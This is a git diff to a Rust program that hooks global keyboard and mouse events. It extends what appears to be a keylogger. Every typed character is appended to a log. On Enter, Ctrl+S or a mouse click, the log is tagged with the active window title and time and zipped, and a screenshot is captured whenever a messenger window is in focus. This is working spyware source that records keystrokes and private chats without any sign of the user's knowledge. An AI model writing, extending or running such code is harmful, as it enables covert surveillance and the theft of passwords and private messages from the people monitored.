@@ -5,6 +5,33 @@ use rdev::{Event, EventType, Button};
 
 use crate::{zip_screenshot, zip_text, is_messengers};
 use crate::{LOG_FILE, LOGGED};
+use crate::AppResult;
+
+fn save_text() -> AppResult<()> {
+    if !*LOGGED.lock().unwrap() {
+        let now = Utc::now();
+        let x: String = format!("{}", now);
+        let now_parsed: DateTime<Utc> = x.parse().unwrap();
+
+        let active_window = get_active_window().unwrap();
+        let info: String = format!("|@{}@{}@|\n", active_window.title, now_parsed.to_string());
+        *LOG_FILE.lock().unwrap() += &info;
+        let logs = LOG_FILE.lock().unwrap().clone();
+
+        zip_text(logs)?;
+
+        if is_messengers(active_window.title) {
+            match zip_screenshot() {
+                Ok(..) => println!("success to zip screenshot."),
+                Err(..) => println!("failed to zip screenshot.")
+            }
+        }
+
+        *LOGGED.lock().unwrap() = true;
+    }
+
+    Ok(())
+}
 
 pub fn callback(event: Event) {
     match event.event_type {
@@ -14,35 +41,7 @@ pub fn callback(event: Event) {
                     match string.as_str() {
                         "\r" => {
                             println!("return pressed");
-                            let now = Utc::now();
-                            let x: String = format!("{}", now);
-                            let now_parsed: DateTime<Utc> = x.parse().unwrap();
-
-                            match get_active_window() {
-                                Ok(active_window) => {
-                                    let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
-                                    *LOG_FILE.lock().unwrap() += &info;
-                                    let logs = LOG_FILE.lock().unwrap().clone();
-
-                                    match zip_text(logs) {
-                                        Ok(_) => {
-                                            *LOGGED.lock().unwrap() = true;
-                                            println!("text written to logs.")
-                                        },
-                                        Err(e) => println!("Error: {e:?}"),
-                                    };
-
-                                    if is_messengers(active_window.title) {
-                                        match zip_screenshot() {
-                                            Ok(..) => println!("success to zip screenshot."),
-                                            Err(..) => println!("failed to zip screenshot.")
-                                        }
-                                    }
-                                },
-                                Err(()) => {
-                                    println!("error occurred while getting the active window");
-                                }
-                            }
+                            let _ = save_text();
                         },
                         "\u{3}" => {
                             println!("copy pressed");
@@ -57,6 +56,7 @@ pub fn callback(event: Event) {
                         },
                         "\u{13}" => {
                             println!("save pressed");
+                            let _ = save_text();
                         },
                         "\u{8}" => {
                             println!("backspace pressed");
@@ -68,8 +68,10 @@ pub fn callback(event: Event) {
                             println!("tab pressed");
                         },
                         _ => {
-                            let x = format!("{}", string);
-                            println!("{}", x);
+                            let _key = format!("{}", string);
+                            *LOG_FILE.lock().unwrap() += &_key;
+                            *LOGGED.lock().unwrap() = false;
+                            println!("{}", _key);
                         }
                     }
                 },
@@ -79,6 +81,7 @@ pub fn callback(event: Event) {
         EventType::ButtonPress(button) => match button {
             Button::Left => {
                 println!("User clicked mouse left button");
+                let _ = save_text();
             },
             Button::Right => {
 
